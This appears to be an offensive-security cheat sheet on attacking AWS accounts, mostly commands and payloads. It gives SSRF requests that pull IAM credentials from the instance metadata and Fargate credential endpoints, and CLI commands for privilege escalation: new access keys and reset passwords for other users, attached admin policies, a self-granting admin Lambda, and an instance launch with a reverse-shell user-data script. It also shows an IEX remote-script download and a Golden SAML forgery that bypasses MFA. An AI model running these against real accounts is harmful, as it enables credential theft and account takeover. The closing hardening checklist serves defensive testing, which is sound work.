# AWS 

## Summary

* [Training](#training)
* [Tools](#tools)
* [AWS - Metadata SSRF](#aws---metadata-ssrf)
  * [Method for Elastic Cloud Compute (EC2)](#method-for-elastic-cloud-compute-ec2)
  * [Method for Container Service (Fargate)](#method-for-container-service-fargate)
* [AWS - Shadow Admin](#aws---shadow-admin)
  * [Admin equivalent permission](#admin-equivalent-permission)
* [AWS - Golden SAML Attack](#aws---golden-saml-attack)
* [Security checks](#security-checks)
* [References](#references)

## Training

* https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6
* https://github.com/nccgroup/sadcloud
* https://github.com/flaws.cloud

## Tools

* **SkyArk** - Discover the most privileged users in the scanned AWS environment - including the AWS Shadow Admins.   
    Require:
    - Read-Only permissions over IAM service

    ```powershell
    $ git clone https://github.com/cyberark/SkyArk
    $ powershell -ExecutionPolicy Bypass -NoProfile
    PS C> Import-Module .\SkyArk.ps1 -force
    PS C> Start-AWStealth

    or in the Cloud Console

    PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1')  
    PS C> Scan-AWShadowAdmins  
    ```

* **Pacu** - Pacu allows penetration testers to exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set.    
    Require:
    - AWS Keys

    ```powershell
    $ git clone https://github.com/RhinoSecurityLabs/pacu
    $ bash install.sh
    $ python3 pacu.py
    set_keys/swap_keys
    ls
    run <module_name> [--keyword-arguments]
    run <module_name> --regions eu-west-1,us-west-1

    # https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details
    ```

* **Prowler** : AWS Security Best Practices Assessment, Auditing, Hardening and Forensics Readiness Tool. It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100).    
    Require:
    - arn:aws:iam::aws:policy/SecurityAudit

    ```powershell
    $ pip install awscli ansi2html detect-secrets
    $ git clone https://github.com/toniblyx/prowler
    $ sudo apt install jq
    $ ./prowler -E check42,check43
    $ ./prowler -p custom-profile -r us-east-1 -c check11
    $ ./prowler -A 123456789012 -R ProwlerRole  # sts assume-role
    ```

* **Principal Mapper** : A tool for quickly evaluating IAM permissions in AWS
    ```powershell
    https://github.com/nccgroup/PMapper
    pip install principalmapper
    pmapper graph --create
    pmapper visualize --filetype png
    pmapper analysis --output-type text

    # Determine if PowerUser can escalate privileges
    pmapper query "preset privesc user/PowerUser"
    pmapper argquery --principal user/PowerUser --preset privesc

    # Find all principals that can escalate privileges
    pmapper query "preset privesc *"
    pmapper argquery --principal '*' --preset privesc

    # Find all principals that PowerUser can access
    pmapper query "preset connected user/PowerUser *"
    pmapper argquery --principal user/PowerUser --resource '*' --preset connected

    # Find all principals that can access PowerUser
    pmapper query "preset connected * user/PowerUser"
    pmapper argquery --principal '*' --resource user/PowerUser --preset connected
    ```

* **ScoutSuite** : https://github.com/nccgroup/ScoutSuite/wiki
    ```powershell
    $ git clone https://github.com/nccgroup/ScoutSuite
    $ python scout.py PROVIDER --help
    # The --session-token is optional and only used for temporary credentials (i.e. role assumption).
    $ python scout.py aws --access-keys --access-key-id <AKIAIOSFODNN7EXAMPLE> --secret-access-key <wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY> --session-token <token>
    $ python scout.py azure --cli
    ```

* **weirdAAL** : AWS Attack Library https://github.com/carnal0wnage/weirdAAL/wiki
    ```powershell
    python3 weirdAAL.py -m ec2_describe_instances -t demo
    python3 weirdAAL.py -m lambda_get_account_settings -t demo
    python3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2' -t yolo
    ```

* **cloudmapper** : CloudMapper helps you analyze your Amazon Web Services (AWS) environments.
    ```powershell
    git clone https://github.com/duo-labs/cloudmapper.git
    # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli
    # You may additionally need "build-essential"
    sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli
    pipenv install --skip-lock
    pipenv shell
    report: Generate HTML report. Includes summary of the accounts and audit findings.
    iam_report: Generate HTML report for the IAM information of an account.
    audit: Check for potential misconfigurations.
    collect: Collect metadata about an account.
    find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges
    ```

## AWS - Metadata SSRF

### Method for Elastic Cloud Compute (EC2)

Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/

1. Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/
    ```powershell
    ami-id
    ami-launch-index
    ami-manifest-path
    block-device-mapping/
    events/
    hostname
    iam/
    identity-credentials/
    instance-action
    instance-id
    ```
2. Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/
    ```powershell
    {
    "Code" : "Success",
    "LastUpdated" : "2019-07-31T23:08:10Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "ASIA54BL6PJR37YOEP67",
    "SecretAccessKey" : "OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2",
    "Token" : "AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv",
    "Expiration" : "2019-08-01T05:20:30Z"
    }
    ```

### Method for Container Service (Fargate)

1. Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ
    ```powershell
    JAVA_ALPINE_VERSION=8.212.04-r0
    HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root
    AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2
    ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd
    ```
2. Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447
    ```powershell
    {
        "RoleArn": "arn:aws:iam::953574914659:role/awesome-waf-role",
        "AccessKeyId": "ASIA54BL6PJR2L75XHVS",
        "SecretAccessKey": "j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt",
        "Token": "FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==",
        "Expiration": "2019-09-18T04:05:59Z"
    }
    ```


## AWS - Shadow Admin 

### Admin equivalent permission 

- AdministratorAccess

    ```powershell
    "Action": "*"
    "Resource": "*"
    ```

- ec2:AssociateIamInstanceProfile

- **iam:CreateAccessKey**iam:CreateAccessKey : create a new access key to another IAM admin account
    ```powershell
    aws iam create-access-key –user-name target_user
    ```

- **iam:CreateLoginProfile** : add a new password-based login profile, set a new password for an entity and impersonate it 
    ```powershell
    $ aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:UpdateLoginProfile** : reset other IAM users’ login passwords.
    ```powershell
    $ aws iam update-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required
    ```

- **iam:AttachUserPolicy**, **iam:AttachGroupPolicy** or **iam:AttachRolePolicy** : attach existing admin policy to any other entity he currently possesses
    ```powershell
    $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    $ aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    $ aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess
    ```

- **iam:PutUserPolicy**, **iam:PutGroupPolicy** or **iam:PutRolePolicy** : added inline policy will allow the attacker to grant additional privileges to previously compromised entities.
    ```powershell
    $ aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json
    ```

- **iam:CreatePolicy** : add a stealthy admin policy
- **iam:AddUserToGroup** : add into the admin group of the organization.
    ```powershell
    $ aws iam add-user-to-group –group-name target_group –user-name my_username
    ```

- **iam:UpdateAssumeRolePolicy** + **sts:AssumeRole** : change the assuming permissions of a privileged role and then assume it with a non-privileged account.
    ```powershell
    $ aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json
    ```

- **iam:CreatePolicyVersion** & **iam:SetDefaultPolicyVersion** : change customer-managed policies and change a non-privileged entity to be a privileged one.
    ```powershell
    $ aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default
    $ aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2
    ```

- **lambda:UpdateFunctionCode** : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.
    ```powershell
    $ aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip
    ```

- **glue:UpdateDevEndpoint** : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint.
    ```powershell
    $ aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub
    ```


- **iam:PassRole** + **ec2:CreateInstanceProfile**/**ec2:AddRoleToInstanceProfile** : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.

- **iam:PassRole** + **ec2:RunInstance** : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.
    ```powershell
    # add ssh key
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456
    # execute a reverse shell
    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh
    ```

- **iam:PassRole** + **lambda:CreateFunction** + **lambda:InvokeFunction** : give a user access to the privileges associated with any Lambda service role that exists in the account.
    ```powershell
    $ aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py
    $ aws lambda invoke –function-name my_function output.txt
    ```
    Example of code.py
    ```python
    import boto3
    def lambda_handler(event, context):
        client = boto3.client('iam')
        response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
        )
        return response
    ```

* **iam:PassRole** + **glue:CreateDevEndpoint** : access to the privileges associated with any Glue service role that exists in the account.
    ```powershell
    $ aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub
    ```

## AWS - Golden SAML Attack

https://www.youtube.com/watch?v=5dj4vOqqGZw    
https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/

> Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user’s password. This attack also bypasses any MFA requirements. 

Requirement:
* Token-signing private key (export from personnal store using Mimikatz)
* IdP public certificate
* IdP name
* Role name (role to assume)

```powershell
$ python -m pip install boto3 botocore defusedxml enum python_dateutil lxml signxml
$ python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file
-u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
```

## Security checks

https://github.com/DenizParlak/Zeus

* Identity and Access Management
  * Avoid the use of the "root" account
  * Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password
  * Ensure credentials unused for 90 days or greater are disabled
  * Ensure access keys are rotated every 90 days or less
  * Ensure IAM password policy requires at least one uppercase letter
  * Ensure IAM password policy requires at least one lowercase letter
  * Ensure IAM password policy requires at least one symbol
  * Ensure IAM password policy requires at least one number
  * Ensure IAM password policy requires minimum length of 14 or greater
  * Ensure no root account access key exists
  * Ensure MFA is enabled for the "root" account
  * Ensure security questions are registered in the AWS account
  * Ensure IAM policies are attached only to groups or role
  * Enable detailed billing
  * Maintain current contact details
  * Ensure security contact information is registered
  * Ensure IAM instance roles are used for AWS resource access from instances
* Logging
  * Ensure CloudTrail is enabled in all regions
  * Ensure CloudTrail log file validation is enabled
  * Ensure the S3 bucket CloudTrail logs to is not publicly accessible
  * Ensure CloudTrail trails are integrated with CloudWatch Logs
  * Ensure AWS Config is enabled in all regions
  * Ensure S3 bucket access logging is enabled on the CloudTrail S3 bucket
  * Ensure CloudTrail logs are encrypted at rest using KMS CMKs
  * Ensure rotation for customer created CMKs is enabled
* Networking
  * Ensure no security groups allow ingress from 0.0.0.0/0 to port 22
  * Ensure no security groups allow ingress from 0.0.0.0/0 to port 3389
  * Ensure VPC flow logging is enabled in all VPC
  * Ensure the default security group of every VPC restricts all traffic
* Monitoring
  * Ensure a log metric filter and alarm exist for unauthorized API calls
  * Ensure a log metric filter and alarm exist for Management Consolesign-in without MFA
  * Ensure a log metric filter and alarm exist for usage of "root" account
  * Ensure a log metric filter and alarm exist for IAM policy changes
  * Ensure a log metric filter and alarm exist for CloudTrail configuration changes
  * Ensure a log metric filter and alarm exist for AWS Management Console authentication failures
  * Ensure a log metric filter and alarm exist for disabling or scheduled deletion of customer created CMKs
  * Ensure a log metric filter and alarm exist for S3 bucket policy changes
  * Ensure a log metric filter and alarm exist for AWS Config configuration changes
  * Ensure a log metric filter and alarm exist for security group changes
  * Ensure a log metric filter and alarm exist for changes to NetworkAccess Control Lists (NACL)
  * Ensure a log metric filter and alarm exist for changes to network gateways
  * Ensure a log metric filter and alarm exist for route table changes
  * Ensure a log metric filter and alarm exist for VPC changes


## References

* https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/
* https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/
* https://github.com/toniblyx/my-arsenal-of-aws-security-tools
* https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
* AWS CLI Cheatsheet https://gist.github.com/apolloclark/b3f60c1f68aa972d324b
* https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/
* https://www.youtube.com/watch?v=XfetW1Vqybw&feature=youtu.be&list=PLBID4NiuWSmfdWCmYGDQtlPABFHN7HyD5
* https://pumascan.com/resources/cloud-security-instance-metadata/